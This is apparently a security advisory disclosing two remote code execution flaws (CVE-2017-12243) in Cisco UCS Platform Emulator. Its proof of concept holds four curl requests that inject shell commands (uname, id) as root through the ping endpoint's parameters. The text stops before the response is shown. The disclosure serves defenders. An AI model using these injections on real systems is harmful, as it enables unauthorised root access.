SSD Advisory – Cisco UCS Platform Emulator Remote Code Execution

Full report: https://blogs.securiteam.com/index.php/archives/3362

Vulnerabilities Summary
The following advisory describes two remote code execution vulnerabilities
found in Cisco UCS Platform Emulator version 3.1(2ePE1).

Cisco UCS Platform Emulator is the Cisco UCS Manager application bundled
into a virtual machine (VM). The VM includes software that emulates
hardware communications for the Cisco Unified Computing System (Cisco UCS)
hardware that is configured and managed by Cisco UCS Manager. For example,
you can use Cisco UCS Platform Emulator to create and test a supported
Cisco UCS configuration, or to duplicate an existing Cisco UCS environment
for troubleshooting or development purposes.

The vulnerabilities found in Cisco UCS Platform Emulator are:

Unauthenticated remote code execution
Authenticated remote code execution

Credit
An independent security researcher has reported this vulnerability to
Beyond Security’s SecuriTeam Secure Disclosure program

Vendor response
The vendor has released patches to address this vulnerability and issue the
following CVE:

CVE-2017-12243

Vulnerabilities details
Unauthenticated remote code execution
User controlled input is not sufficiently sanitized when passed to
IP/settings/ping function. An unauthenticated attacker can inject commands
via PING_NUM and PING_IP_ADDR parameters. Those commands will run as root
on the remote machine.

Proof of Concept

===

curl "
http://IP/settings/ping?ping_num=1&ping_ip_addr=127.0.0.1%3buname+-a%3b#"

curl -k "
https://IP/settings/ping?ping_num=1&ping_ip_addr=127.0.0.1%3buname+-a%3b#"

curl "http://IP/settings/ping?ping_num=1%3bid%3b#&ping_ip_addr=127.0.0.1"

curl -k "
https://IP/settings/ping?ping_num=1%3buname+-a%3b#&ping_ip_addr=127.0.0.1"

By sending one of the above requests the Cisco UCS will response with:
